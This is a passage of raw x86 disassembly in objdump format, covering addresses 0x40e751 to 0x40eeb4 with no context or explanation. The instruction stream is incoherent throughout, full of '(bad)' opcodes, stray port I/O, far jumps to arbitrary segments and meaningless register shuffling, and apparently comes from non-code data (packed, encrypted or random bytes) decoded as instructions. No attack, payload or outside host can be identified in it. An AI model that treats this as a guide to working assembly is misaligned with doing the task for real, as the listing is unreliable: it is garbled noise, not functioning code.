  40e751:	cmp    eax,0x2ace1a73
  40e756:	imul   ebx,DWORD PTR [edi-0x1d],0x83f343b2
  40e75d:	arpl   WORD PTR [edx-0x2d9d46e],si
  40e763:	pop    ebx
  40e764:	ror    ebp,cl
  40e766:	fisub  DWORD PTR [eax]
  40e768:	jmp    0x40e7c4
  40e76a:	add    BYTE PTR [edx+0x3440d7ef],dh
  40e770:	push   es
  40e771:	repnz dec ecx
  40e773:	push   ebx
  40e774:	push   edx
  40e775:	jl     0x40e756
  40e777:	aad    0x50
  40e779:	add    cl,ah
  40e77b:	shl    DWORD PTR [esi+0x62373b0e],cl
  40e781:	imul   ebp,edx,0xacfb5ce6
  40e787:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e788:	xchg   edi,eax
  40e789:	dec    ebx
  40e78a:	(bad)  
  40e78b:	or     eax,DWORD PTR [ecx]
  40e78d:	sbb    esp,ebp
  40e78f:	mov    edx,0x77865175
  40e794:	ins    DWORD PTR es:[edi],dx
  40e795:	push   esp
  40e796:	fcomp  st(6)
  40e798:	cwde   
  40e799:	ins    DWORD PTR es:[edi],dx
  40e79a:	adc    al,0x79
  40e79c:	in     al,dx
  40e79d:	lea    ebx,[ebx-0x310fcbaf]
  40e7a3:	jbe    0x40e752
  40e7a5:	gs (bad) 
  40e7a7:	(bad)  
  40e7a8:	mov    esi,0x68ace849
  40e7ad:	dec    ebx
  40e7ae:	les    ebp,FWORD PTR [ecx]
  40e7b0:	iret   
  40e7b1:	frstpm(287 only) 
  40e7b3:	ins    BYTE PTR es:[edi],dx
  40e7b4:	sub    al,0xd2
  40e7b6:	loope  0x40e77a
  40e7b8:	out    dx,eax
  40e7b9:	ret    
  40e7ba:	jb     0x40e762
  40e7bc:	xchg   DWORD PTR [ebx+eiz*8-0xb267c60],esi
  40e7c3:	enter  0x6bbc,0x50
  40e7c7:	pop    ds
  40e7c8:	jnp    0x40e815
  40e7ca:	xchg   BYTE PTR [eax-0x7fa8a70],al
  40e7d0:	cmc    
  40e7d1:	daa    
  40e7d2:	imul   BYTE PTR [edx+0x36d2806]
  40e7d8:	push   cs
  40e7d9:	repnz fst DWORD PTR [edi+0x2722b062]
  40e7e0:	imul   edx,DWORD PTR [edx-0x4c78f32f],0x7b1e548a
  40e7ea:	and    edi,ebx
  40e7ec:	je     0x40e7fb
  40e7ee:	jmp    FWORD PTR [edx-0x51]
  40e7f1:	pop    ss
  40e7f2:	ja     0x40e81c
  40e7f4:	div    DWORD PTR [edx+edi*8]
  40e7f7:	mov    al,0x38
  40e7f9:	(bad)  
  40e7fa:	loope  0x40e816
  40e7fc:	mov    eax,0xbd29adb8
  40e801:	push   edx
  40e802:	std    
  40e803:	xor    al,0x74
  40e805:	xlat   BYTE PTR ds:[ebx]
  40e806:	cmp    dh,0x1c
  40e809:	push   0x4bb81f84
  40e80e:	xchg   esp,eax
  40e80f:	jecxz  0x40e801
  40e811:	(bad)  
  40e812:	mov    ebp,0x90637801
  40e817:	call   0xddb6cf09
  40e81c:	sahf   
  40e81d:	add    DWORD PTR [edx+0x4a],ecx
  40e820:	sti    
  40e821:	jmp    0x40e897
  40e823:	arpl   WORD PTR [ecx+0x2dee159d],bp
  40e829:	sbb    al,0x55
  40e82b:	xor    DWORD PTR [ebx+0x65],ebp
  40e82e:	push   edx
  40e82f:	jno    0x40e85b
  40e831:	cmp    al,0xb9
  40e833:	pop    edi
  40e834:	lock and al,0xc0
  40e837:	fwait
  40e838:	jmp    0x40e82c
  40e83a:	cmc    
  40e83b:	ror    ebp,0x24
  40e83e:	and    DWORD PTR [ebp+0x5ccdf10f],0x34
  40e845:	out    dx,al
  40e846:	xor    BYTE PTR [ebp-0xf],dl
  40e849:	js     0x40e8b0
  40e84b:	sub    bl,BYTE PTR [edi]
  40e84d:	add    edx,DWORD PTR [ebp-0x127bfcb4]
  40e853:	or     ah,0x38
  40e856:	mov    eax,0xaa9ca72b
  40e85b:	loope  0x40e89b
  40e85d:	xor    BYTE PTR cs:[esi+0x3],dh
  40e861:	neg    DWORD PTR [ebx-0x2739249f]
  40e867:	into   
  40e868:	mov    ah,BYTE PTR [edx-0x3926cff]
  40e86e:	mov    ebp,0xbdba6ac5
  40e873:	dec    ebp
  40e874:	cmp    bh,BYTE PTR [esi]
  40e876:	and    ebx,DWORD PTR [ebp+0x4e]
  40e879:	mov    edx,0xd31be4e5
  40e87e:	iretw  
  40e880:	lods   al,BYTE PTR ds:[esi]
  40e881:	fs and al,0xe2
  40e884:	jp     0x40e86d
  40e886:	jmp    0xaee5:0x6da0bc00
  40e88d:	neg    DWORD PTR [edx+0x26]
  40e890:	push   esi
  40e891:	lahf   
  40e892:	sub    al,0x85
  40e894:	ins    DWORD PTR es:[edi],dx
  40e895:	adc    DWORD PTR [ebx],ebx
  40e897:	imul   esi,DWORD PTR [edi-0x34d0dea6],0x39
  40e89e:	jne    0x40e896
  40e8a0:	xchg   esp,eax
  40e8a1:	xchg   ebp,eax
  40e8a2:	idiv   BYTE PTR [ebp+edx*1-0x4b]
  40e8a6:	sbb    al,0x5a
  40e8a8:	rcr    DWORD PTR [ecx],0xf6
  40e8ab:	rol    BYTE PTR [edi+edx*8-0x33ec36b6],0xae
  40e8b3:	sbb    cl,bh
  40e8b5:	lahf   
  40e8b6:	sar    BYTE PTR [edx],1
  40e8b8:	mov    edi,0x4a2925f5
  40e8bd:	in     eax,dx
  40e8be:	dec    ebx
  40e8bf:	push   0xe61fd5a9
  40e8c4:	(bad)  
  40e8c5:	shr    BYTE PTR [esi],cl
  40e8c7:	sub    esp,ebx
  40e8c9:	cmp    ebp,edi
  40e8cb:	mov    ebx,DWORD PTR [esi+0x493f3478]
  40e8d1:	test   DWORD PTR [ecx+edi*2-0x452f7199],esp
  40e8d8:	pop    edi
  40e8d9:	sbb    eax,0xcc405140
  40e8de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8df:	push   0x74ca7a8c
  40e8e4:	daa    
  40e8e5:	dec    ecx
  40e8e6:	sub    dh,BYTE PTR [ebp+0x37538272]
  40e8ec:	or     ebx,ebp
  40e8ee:	stos   DWORD PTR es:[edi],eax
  40e8ef:	add    BYTE PTR [ecx],0x41
  40e8f2:	mov    fs,eax
  40e8f4:	sub    cl,0x5d
  40e8f7:	lds    ebx,FWORD PTR [edx]
  40e8f9:	cmp    eax,DWORD PTR [esi+0x33]
  40e8fc:	mov    ds,WORD PTR [eax]
  40e8fe:	xchg   ebp,eax
  40e8ff:	repz xchg esi,eax
  40e901:	aas    
  40e902:	retf   
  40e903:	mov    ch,0xff
  40e905:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e906:	imul   edx,DWORD PTR [bx-0x44],0xe4bb62b9
  40e90e:	int    0x4c
  40e910:	jnp    0x40e8af
  40e912:	les    esp,FWORD PTR [edi]
  40e914:	jl     0x40e937
  40e916:	cmp    dh,BYTE PTR [ebx+ecx*4]
  40e919:	ins    DWORD PTR es:[edi],dx
  40e91a:	sub    bl,BYTE PTR [edx]
  40e91c:	ss out 0xc4,al
  40e91f:	ss mov edi,cs
  40e922:	test   DWORD PTR [ecx-0x39e5738f],edi
  40e928:	scas   al,BYTE PTR es:[edi]
  40e929:	mov    BYTE PTR [ecx+0x7a],ah
  40e92c:	ss (bad) 
  40e92e:	fmul   DWORD PTR [edi+ebp*4+0x6d16ebad]
  40e935:	es jo  0x40e982
  40e938:	ins    DWORD PTR es:[edi],dx
  40e939:	adc    ah,ch
  40e93b:	loop   0x40e8ed
  40e93d:	pop    ss
  40e93e:	std    
  40e93f:	ins    BYTE PTR es:[edi],dx
  40e940:	dec    edx
  40e941:	(bad)
  40e945:	sub    dh,BYTE PTR [esi+0x1593d2dd]
  40e94b:	sbb    ecx,DWORD PTR [edx]
  40e94d:	pop    edi
  40e94e:	bound  ecx,QWORD PTR [esi]
  40e950:	ins    DWORD PTR es:[edi],dx
  40e951:	out    0x11,al
  40e953:	jg     0x40e95d
  40e955:	mov    al,0x29
  40e957:	and    eax,0xc80d39da
  40e95c:	icebp  
  40e95d:	imul   edi,DWORD PTR [eax],0x8aed967f
  40e963:	mov    al,ds:0x1260421b
  40e968:	inc    ecx
  40e969:	mov    edi,0x4bedbc98
  40e96e:	sbb    al,0xc0
  40e970:	jno    0x40e988
  40e972:	rcl    DWORD PTR [esi+0x35506215],cl
  40e978:	ins    DWORD PTR es:[edi],dx
  40e979:	dec    esp
  40e97a:	hlt    
  40e97b:	std    
  40e97c:	pushf  
  40e97d:	dec    edi
  40e97e:	dec    ebx
  40e97f:	mov    ebp,0x6d820e59
  40e984:	(bad)
  40e989:	ins    BYTE PTR es:[edi],dx
  40e98a:	xchg   ebx,eax
  40e98b:	mov    ebp,0xd8379226
  40e990:	test   al,bh
  40e992:	jns    0x40e995
  40e994:	add    dh,ch
  40e996:	fwait
  40e997:	jmp    0xac54bbab
  40e99c:	cmp    dl,dl
  40e99e:	sahf   
  40e99f:	outs   dx,DWORD PTR ds:[esi]
  40e9a0:	sahf   
  40e9a1:	and    al,bl
  40e9a3:	push   0x6e80a98f
  40e9a8:	mov    ch,0xe2
  40e9aa:	push   ss
  40e9ab:	loope  0x40e9f4
  40e9ad:	ins    BYTE PTR es:[edi],dx
  40e9ae:	and    BYTE PTR es:[ebx],bl
  40e9b1:	adc    DWORD PTR [ebp+0x4c],ebp
  40e9b4:	outs   dx,BYTE PTR ds:[esi]
  40e9b5:	fcom   DWORD PTR [edi+0x6095db86]
  40e9bb:	popf   
  40e9bc:	pop    eax
  40e9bd:	cdq    
  40e9be:	jbe    0x98de9d4c
  40e9c4:	adc    bh,bh
  40e9c6:	pop    ss
  40e9c7:	sar    BYTE PTR [edi-0x6a2a0370],1
  40e9cd:	jl     0x40e9fb
  40e9cf:	pop    ebx
  40e9d0:	fdivr  DWORD PTR [ecx-0x33]
  40e9d3:	lods   eax,DWORD PTR ds:[esi]
  40e9d4:	jnp    0x40e9db
  40e9d6:	aam    0xe5
  40e9d8:	pop    edx
  40e9d9:	cmp    BYTE PTR [esi],cl
  40e9db:	addr16 xor ax,0xa7b2
  40e9e0:	aam    0x47
  40e9e2:	lds    esi,FWORD PTR [esi-0xc02943e]
  40e9e8:	lods   eax,DWORD PTR ds:[esi]
  40e9e9:	imul   DWORD PTR [eax+0x32]
  40e9ec:	push   ds
  40e9ed:	sbb    eax,0x375633bb
  40e9f2:	call   0x6ee05e2d
  40e9f7:	jl     0x40ea36
  40e9f9:	mov    edx,0xfda3970a
  40e9fe:	out    dx,eax
  40e9ff:	jge    0x40ea73
  40ea01:	mov    edx,0xddc7cd9f
  40ea06:	inc    esi
  40ea07:	xchg   ebx,eax
  40ea08:	push   ebp
  40ea09:	xchg   edi,esi
  40ea0b:	xor    BYTE PTR ds:0x19a1c2da,al
  40ea11:	jg     0x40e9a2
  40ea13:	rcl    BYTE PTR [edx],0x64
  40ea16:	cmp    BYTE PTR [ecx],cl
  40ea18:	mov    edi,0xd740416f
  40ea1d:	mov    dl,0xa3
  40ea1f:	mov    ds,ebx
  40ea21:	fwait
  40ea22:	add    al,0x1
  40ea24:	jb     0x40e9f8
  40ea26:	dec    esi
  40ea27:	inc    edx
  40ea28:	inc    ecx
  40ea29:	outs   dx,BYTE PTR ds:[esi]
  40ea2a:	popf   
  40ea2b:	call   0x9d6796a4
  40ea30:	lds    ebx,FWORD PTR [edi+0x51]
  40ea33:	add    ecx,ecx
  40ea35:	or     eax,0xbc55993
  40ea3a:	ret    0xe527
  40ea3d:	adc    ebx,DWORD PTR [edi]
  40ea3f:	call   0x87c2:0xb39e208f
  40ea46:	or     ch,BYTE PTR [ecx+eax*4-0x7253fd68]
  40ea4d:	xor    cl,BYTE PTR [esi-0x2a]
  40ea50:	repz xor DWORD PTR [ecx-0x47e4e4d5],ebx
  40ea57:	shr    bh,0xe7
  40ea5a:	mov    edi,0xedfa0800
  40ea5f:	inc    ebp
  40ea60:	inc    ebp
  40ea61:	mov    bh,0xa9
  40ea63:	push   ebx
  40ea64:	test   ebx,ecx
  40ea66:	gs mov cl,0xda
  40ea69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea6a:	ins    DWORD PTR es:[edi],dx
  40ea6b:	popa   
  40ea6c:	cmp    ebx,DWORD PTR [esi-0x22]
  40ea6f:	mov    edi,DWORD PTR [ecx]
  40ea71:	mov    dh,0xe9
  40ea73:	outs   dx,DWORD PTR ds:[esi]
  40ea74:	mov    al,ds:0x7b7e9747
  40ea79:	inc    esp
  40ea7a:	push   esi
  40ea7b:	ins    DWORD PTR es:[edi],dx
  40ea7c:	cmc    
  40ea7d:	js     0x40eae0
  40ea7f:	cmp    DWORD PTR [ebx+0x1b0d6cd9],ecx
  40ea85:	xlat   BYTE PTR ds:[ebx]
  40ea86:	fldenv [edi-0x30]
  40ea89:	scas   al,BYTE PTR es:[edi]
  40ea8a:	sbb    DWORD PTR [esp+edx*2+0x18],ebp
  40ea8e:	mov    edi,0x87298e04
  40ea93:	jmp    0x40ea9f
  40ea95:	mov    BYTE PTR [edx+0x57],al
  40ea98:	pop    ebp
  40ea99:	jae    0x40eabc
  40ea9b:	ret    
  40ea9c:	sar    DWORD PTR [ebp-0x5b477b70],cl
  40eaa2:	pop    edx
  40eaa3:	xchg   ebx,eax
  40eaa4:	jnp    0x40eab3
  40eaa6:	xchg   BYTE PTR [edi],dh
  40eaa8:	lods   al,BYTE PTR ds:[esi]
  40eaa9:	cli    
  40eaaa:	and    DWORD PTR [ecx+0x1ac1fd5d],0xffffff83
  40eab1:	push   esi
  40eab2:	stos   DWORD PTR es:[edi],eax
  40eab3:	and    BYTE PTR [edx],ah
  40eab5:	pop    ebp
  40eab6:	xchg   esp,eax
  40eab7:	jb     0x40ea74
  40eab9:	mov    dh,BYTE PTR [ecx+0x2a]
  40eabc:	imul   BYTE PTR [ebp+0x62]
  40eabf:	call   0xe9a6:0x86141dfd
  40eac6:	dec    edi
  40eac7:	inc    esi
  40eac8:	dec    ecx
  40eac9:	rcl    BYTE PTR [esi+eiz*8+0x3],0xb1
  40eace:	add    eax,edx
  40ead0:	imul   esi,esi,0xffffff82
  40ead3:	fisttp DWORD PTR [ecx+0x9b4d80]
  40ead9:	(bad)  es:[edx]
  40eadc:	in     al,dx
  40eadd:	xchg   edi,eax
  40eade:	fidivr DWORD PTR [edi+0x3f016dc1]
  40eae4:	mov    DWORD PTR [edx+0x9631f46],esp
  40eaea:	xor    BYTE PTR [esi-0x6b],ah
  40eaed:	shr    BYTE PTR [eax],0x55
  40eaf0:	adc    al,0xb2
  40eaf2:	ins    DWORD PTR es:[edi],dx
  40eaf3:	sahf   
  40eaf4:	stc    
  40eaf5:	ins    BYTE PTR es:[edi],dx
  40eaf6:	jo     0x40ead4
  40eaf8:	cmp    DWORD PTR [edx-0x43],edx
  40eafb:	aad    0xaf
  40eafd:	and    esi,DWORD PTR [edi]
  40eaff:	mov    bh,0x6f
  40eb01:	pushf  
  40eb02:	mov    edi,0xed42613c
  40eb07:	repnz cmp BYTE PTR ds:0x372a706a,dh
  40eb0e:	inc    ebx
  40eb0f:	mov    ds:0x6c94719f,al
  40eb14:	push   esi
  40eb15:	fistp  WORD PTR [ecx+0x151fd5ee]
  40eb1b:	pop    es
  40eb1c:	shr    DWORD PTR [edi],1
  40eb1e:	imul   eax,DWORD PTR [ebx],0x12301de3
  40eb24:	rol    BYTE PTR [ebx],1
  40eb26:	loopne 0x40ead5
  40eb28:	pop    eax
  40eb29:	dec    ebx
  40eb2a:	jnp    0x40eb80
  40eb2c:	mov    ah,0x5c
  40eb2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb2f:	xor    eax,DWORD PTR [edx-0x6d18d3a4]
  40eb35:	pop    edx
  40eb36:	sbb    edi,DWORD PTR [esi]
  40eb38:	gs mov edi,0xadb86cbe
  40eb3e:	xor    cl,BYTE PTR fs:[ecx-0x57]
  40eb42:	xchg   edi,eax
  40eb43:	mov    ah,0xd5
  40eb45:	lock sub al,0x62
  40eb48:	xchg   esi,eax
  40eb49:	lods   al,BYTE PTR ds:[esi]
  40eb4a:	std    
  40eb4b:	hlt    
  40eb4c:	loope  0x40eb17
  40eb4e:	push   edx
  40eb4f:	in     eax,dx
  40eb50:	outs   dx,DWORD PTR ds:[esi]
  40eb51:	and    esp,ebx
  40eb53:	js     0x40ebcc
  40eb55:	jmp    0x3b06:0x4db66a25
  40eb5c:	jle    0x40eb53
  40eb5e:	jl     0x40eb09
  40eb60:	xchg   esp,eax
  40eb61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb62:	leave  
  40eb63:	and    BYTE PTR [eax-0x63028fa3],0x48
  40eb6a:	jb     0x40eb20
  40eb6c:	iret   
  40eb6d:	push   0x7ba2f87
  40eb72:	xor    ecx,eax
  40eb74:	lea    edi,[edx]
  40eb76:	jge    0x40ebed
  40eb78:	mov    ds:0x8b1b0384,eax
  40eb7d:	cmp    DWORD PTR [edi+ecx*8-0x2efc89b5],esp
  40eb84:	scas   al,BYTE PTR es:[edi]
  40eb85:	mov    DWORD PTR [edx+0x51],edx
  40eb88:	into   
  40eb89:	pop    eax
  40eb8a:	mov    DWORD PTR [ecx+0x54],ebx
  40eb8d:	jno    0x40ebf1
  40eb8f:	movmskps esp,xmm3
  40eb92:	imul   esp,DWORD PTR [ebx],0x62
  40eb95:	cdq    
  40eb96:	jmp    0x44ec:0xb80b872a
  40eb9d:	push   edi
  40eb9e:	pop    ebp
  40eb9f:	out    0x34,eax
  40eba1:	jae    0x40eba7
  40eba3:	adc    BYTE PTR [edi+0x6558c0e4],ah
  40eba9:	xchg   esp,eax
  40ebaa:	out    0x67,eax
  40ebac:	mov    ah,0x29
  40ebae:	sbb    al,0x22
  40ebb0:	out    dx,al
  40ebb1:	in     al,dx
  40ebb2:	in     eax,dx
  40ebb3:	mov    ds:0x7bf04d4e,eax
  40ebb8:	sub    al,0x1b
  40ebba:	test   eax,0x5e1cb70c
  40ebbf:	aad    0xff
  40ebc1:	jmp    0xe06faa08
  40ebc6:	dec    esp
  40ebc7:	and    esi,DWORD PTR [eax+0x3d]
  40ebca:	aam    0x65
  40ebcc:	push   edx
  40ebcd:	fstp   QWORD PTR ss:[ecx-0x12]
  40ebd1:	cmp    esi,DWORD PTR [eax+0x1d59fd77]
  40ebd7:	adc    ebx,esp
  40ebd9:	cmp    eax,0x7e9755c
  40ebde:	pop    eax
  40ebdf:	adc    al,0x90
  40ebe1:	scas   eax,DWORD PTR es:[edi]
  40ebe2:	scas   al,BYTE PTR es:[edi]
  40ebe3:	cvtps2pd xmm5,xmm7
  40ebe6:	repz dec edi
  40ebe8:	jb     0x40ec3a
  40ebea:	xchg   edi,eax
  40ebeb:	jecxz  0x40ebc5
  40ebed:	dec    esp
  40ebee:	fadd   DWORD PTR [edx]
  40ebf0:	add    eax,eax
  40ebf2:	dec    ebx
  40ebf3:	aad    0x70
  40ebf5:	push   ds
  40ebf6:	cdq    
  40ebf7:	icebp  
  40ebf8:	outs   dx,BYTE PTR ds:[esi]
  40ebfa:	and    ch,dh
  40ebfc:	int3   
  40ebfd:	aaa    
  40ebfe:	add    eax,ebx
  40ec00:	lea    esi,[esi+0x4e]
  40ec03:	adc    dh,BYTE PTR [ecx+esi*2+0x4cb87025]
  40ec0a:	loope  0x40ec04
  40ec0c:	inc    ecx
  40ec0d:	pop    edi
  40ec0e:	push   edx
  40ec0f:	dec    edx
  40ec10:	inc    ebx
  40ec11:	int3   
  40ec12:	cwde   
  40ec13:	out    dx,al
  40ec14:	stos   DWORD PTR es:[edi],eax
  40ec15:	jmp    0x4c23:0xf1f1508a
  40ec1c:	outs   dx,DWORD PTR ds:[esi]
  40ec1d:	shl    DWORD PTR [ebx],1
  40ec1f:	push   esp
  40ec20:	enter  0x4bf5,0x2b
  40ec24:	sbb    BYTE PTR [ebp-0x21cfbce6],0xcd
  40ec2b:	fidiv  DWORD PTR [ecx-0x61ef4002]
  40ec31:	mov    dh,0x28
  40ec33:	cdq    
  40ec34:	inc    esi
  40ec35:	(bad)  
  40ec36:	sub    esp,ecx
  40ec38:	das    
  40ec39:	shl    DWORD PTR [esi-0x5731bb16],1
  40ec3f:	mov    esi,ecx
  40ec41:	jmp    0xbd48:0xd8551033
  40ec48:	cmp    DWORD PTR [edi+0x73be044c],ecx
  40ec4e:	leave  
  40ec4f:	or     eax,0x55b1c598
  40ec54:	sbb    eax,0x17081146
  40ec59:	mov    BYTE PTR [esi+0x5a6e45cb],0xfa
  40ec60:	out    dx,al
  40ec61:	sub    eax,0x67f04bad
  40ec66:	lods   eax,DWORD PTR ds:[esi]
  40ec67:	rcr    BYTE PTR [edi-0x25],cl
  40ec6a:	push   0x86128f0d
  40ec6f:	and    DWORD PTR [esi],ecx
  40ec71:	test   bh,0xf5
  40ec74:	cmp    esi,esi
  40ec76:	arpl   cx,ax
  40ec78:	adc    esp,DWORD PTR [ebx-0x43]
  40ec7b:	ret    
  40ec7c:	sub    al,0xaf
  40ec7e:	and    DWORD PTR [esi+ebp*8],edi
  40ec81:	(bad)  
  40ec84:	or     eax,0xa114e2dd
  40ec89:	out    0xb9,al
  40ec8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec8c:	imul   eax,DWORD PTR [edx],0xffffffe8
  40ec8f:	fwait
  40ec90:	pop    edx
  40ec91:	add    BYTE PTR ss:[eax+0x65],0xba
  40ec96:	dec    edx
  40ec97:	loope  0x40ecb8
  40ec99:	inc    ebx
  40ec9a:	int3   
  40ec9b:	retf   0x15fe
  40ec9e:	inc    ebx
  40ec9f:	adc    bh,BYTE PTR [esi+0x36]
  40eca2:	call   0x68b:0x5ea0ea6b
  40eca9:	loopne 0x40ecc9
  40ecab:	pop    eax
  40ecac:	jmp    0x40ec60
  40ecae:	mov    edx,DWORD PTR [ecx+esi*8-0x21ab0007]
  40ecb5:	dec    edi
  40ecb6:	addr16 push edi
  40ecb8:	xchg   DWORD PTR [eax-0x307133cc],ebp
  40ecbe:	(bad)  
  40ecbf:	leave  
  40ecc0:	fstp   TBYTE PTR [ebp-0x390e1fab]
  40ecc6:	(bad)  
  40ecc7:	popa   
  40ecc8:	and    ebx,0x10e1daa2
  40ecce:	inc    ebp
  40eccf:	ins    BYTE PTR es:[edi],dx
  40ecd0:	mov    bh,0x39
  40ecd2:	loopne 0x40ed40
  40ecd4:	jge    0x40ed4c
  40ecd6:	pop    eax
  40ecd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecd8:	outs   dx,BYTE PTR ds:[esi]
  40ecd9:	popf   
  40ecda:	lds    ebp,FWORD PTR [eax]
  40ecdc:	mov    eax,ds:0x8a17207b
  40ece1:	mov    edx,DWORD PTR [esi]
  40ece3:	adc    eax,0x256dca1f
  40ece8:	dec    edi
  40ece9:	rol    ebx,0x9a
  40ecec:	les    esi,FWORD PTR [ebp+0x37]
  40ecef:	loopne 0x40ed60
  40ecf1:	sub    eax,0x60866845
  40ecf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecf7:	call   0x83996ce6
  40ecfc:	cmp    ah,BYTE PTR [edx+0x6eb0621f]
  40ed02:	xchg   ebp,eax
  40ed03:	sub    al,0xdd
  40ed05:	xor    DWORD PTR [esp+esi*4+0x7062f412],0xe6db5ecb
  40ed10:	adc    edi,DWORD PTR [esi+edx*8+0x23d96713]
  40ed17:	inc    edi
  40ed18:	fwait
  40ed19:	cmp    DWORD PTR ds:0x6d96a794,esp
  40ed1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed20:	xchg   WORD PTR [edx+edi*8+0x78a92978],ax
  40ed28:	fistp  QWORD PTR [ebx]
  40ed2a:	mov    ds,WORD PTR [ebx]
  40ed2c:	stc    
  40ed2d:	xchg   ebp,eax
  40ed2e:	mov    ds:0x7eb3b7e6,al
  40ed33:	rcr    BYTE PTR [esi-0x18],0x47
  40ed37:	call   0xf707b210
  40ed3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed3d:	jne    0x40eda2
  40ed3f:	xor    DWORD PTR [eax-0x2613d63d],ecx
  40ed45:	or     al,0x7c
  40ed47:	xor    eax,0x57c4f3ec
  40ed4c:	mov    DWORD PTR [esi+esi*2+0x1eed9d85],edx
  40ed53:	scas   al,BYTE PTR es:[edi]
  40ed54:	(bad)  
  40ed55:	mov    eax,ds:0xbc9a300f
  40ed5a:	lock sbb edi,ebx
  40ed5d:	pop    ecx
  40ed5e:	xor    al,0x2
  40ed60:	and    eax,0x5343245b
  40ed65:	xor    ch,BYTE PTR [ebx+0x3e]
  40ed68:	loop   0x40edd3
  40ed6a:	mov    eax,ds:0xf17bea9
  40ed6f:	xchg   ebx,eax
  40ed70:	mov    eax,esi
  40ed72:	or     ah,al
  40ed74:	scas   al,BYTE PTR es:[edi]
  40ed75:	gs mov cl,0x2d
  40ed78:	(bad)
  40ed7b:	add    esi,DWORD PTR [edx-0x9]
  40ed7e:	add    bl,dh
  40ed80:	enter  0xdbbd,0x7b
  40ed84:	xor    al,0xfc
  40ed86:	add    DWORD PTR [edx+0x3f9c6538],edx
  40ed8c:	pop    ecx
  40ed8d:	and    dl,al
  40ed8f:	mov    dh,0xe2
  40ed91:	test   al,0x4b
  40ed93:	jmp    0x40ed4d
  40ed95:	and    dh,BYTE PTR [eax+0x7c]
  40ed98:	shl    BYTE PTR [ecx+0x23],0x11
  40ed9c:	enter  0x9136,0x32
  40eda0:	mov    ebx,DWORD PTR [ebp-0x5d7b7727]
  40eda6:	sub    al,0x96
  40eda8:	jns    0x40ed2d
  40edaa:	fcom   QWORD PTR [esi-0x62]
  40edad:	and    dh,BYTE PTR [ebp-0x1f5d8e18]
  40edb3:	jns    0x40ed6a
  40edb5:	addr16 xchg ecx,eax
  40edb7:	popf   
  40edb8:	fistp  WORD PTR [eax]
  40edba:	test   al,0xa9
  40edbc:	sti    
  40edbd:	pop    ss
  40edbe:	ja     0x40ede6
  40edc0:	ss pop esp
  40edc2:	cmp    al,0xa5
  40edc4:	frstor [ebp+0x5f1de55]
  40edca:	sar    DWORD PTR [ebx+edi*1-0x31],0x97
  40edcf:	call   0x9adeba41
  40edd4:	jae    0x40ed91
  40edd6:	(bad)  
  40edd7:	test   DWORD PTR [ebx],0x4323941d
  40eddd:	mov    es:0xc8be1525,al
  40ede3:	jmp    0x8086d776
  40ede8:	shl    edi,cl
  40edea:	push   edi
  40edeb:	add    bl,BYTE PTR [edx-0x2b413358]
  40edf1:	cmc    
  40edf2:	daa    
  40edf3:	and    BYTE PTR [ebp+eiz*4-0x5ccd65f4],bh
  40edfa:	jbe    0x40ee74
  40edfc:	hlt    
  40edfd:	mov    eax,0x460ccdce
  40ee02:	(bad)  
  40ee03:	fs seta cl
  40ee07:	sti    
  40ee08:	(bad)  [edx+0x3b]
  40ee0b:	cmp    eax,0xdbb1c1cb
  40ee10:	inc    eax
  40ee11:	and    bh,BYTE PTR [esi]
  40ee13:	mov    cl,0x34
  40ee15:	stos   BYTE PTR es:[edi],al
  40ee16:	mov    DWORD PTR [esp+ebx*1-0x34],ecx
  40ee1a:	(bad)  
  40ee1b:	xor    edx,edi
  40ee1d:	ret    
  40ee1e:	clc    
  40ee1f:	loopne 0x40edb0
  40ee21:	xchg   esp,eax
  40ee22:	retf   
  40ee23:	dec    esp
  40ee24:	bound  ebx,QWORD PTR [ecx+eax*2]
  40ee27:	mov    BYTE PTR fs:[ebp+0x337ecb79],bl
  40ee2e:	hlt    
  40ee2f:	ficomp WORD PTR [edi+0x30d5dea9]
  40ee35:	test   DWORD PTR [edi],esp
  40ee37:	pop    edi
  40ee38:	add    DWORD PTR ds:0xd2a5fe79,ebp
  40ee3e:	push   ss
  40ee3f:	stos   BYTE PTR es:[edi],al
  40ee40:	psrlw  mm7,QWORD PTR [ebx-0x18]
  40ee44:	inc    esp
  40ee45:	adc    ch,al
  40ee47:	push   ebp
  40ee48:	shr    DWORD PTR [ecx*8+0x4fe0fc45],1
  40ee4f:	sti    
  40ee50:	push   edx
  40ee51:	fidivr DWORD PTR [eax+ebp*1+0x32]
  40ee55:	add    esp,DWORD PTR [ebx+0x604e9040]
  40ee5b:	popf   
  40ee5c:	push   edx
  40ee5d:	mov    esi,0x6ece464b
  40ee62:	ins    DWORD PTR es:[edi],dx
  40ee63:	mov    dh,0x9d
  40ee65:	dec    edi
  40ee66:	jmp    0x607895cc
  40ee6b:	and    al,0x2a
  40ee6d:	cmc    
  40ee6e:	mov    ds:0x5cfb739,al
  40ee73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee74:	sub    bh,BYTE PTR [edx+0x20]
  40ee77:	mov    dl,0x2e
  40ee79:	(bad)  
  40ee7b:	gs call 0xe0fb:0x92deb0ba
  40ee83:	pop    edi
  40ee84:	jp     0x40eef2
  40ee86:	dec    edi
  40ee87:	enter  0x1af9,0xca
  40ee8b:	scas   eax,DWORD PTR es:[edi]
  40ee8c:	out    0xe3,eax
  40ee8e:	mov    ecx,0x45bc8465
  40ee93:	nop
  40ee94:	in     eax,0x7b
  40ee96:	push   edx
  40ee97:	(bad)  
  40ee98:	cli    
  40ee99:	in     eax,dx
  40ee9a:	push   ebp
  40ee9b:	xor    ch,BYTE PTR [esi-0x1d]
  40ee9e:	jecxz  0x40ee55
  40eea0:	in     al,dx
  40eea1:	add    al,0x9f
  40eea3:	pop    ebx
  40eea4:	mov    ecx,0x1a4889cd
  40eea9:	jo     0x40ee83
  40eeab:	sbb    eax,0xa0c9fac5
  40eeb0:	cmp    al,0x64
  40eeb2:	jmp    FWORD PTR [edi]
  40eeb4:	jbe    0x40ee86
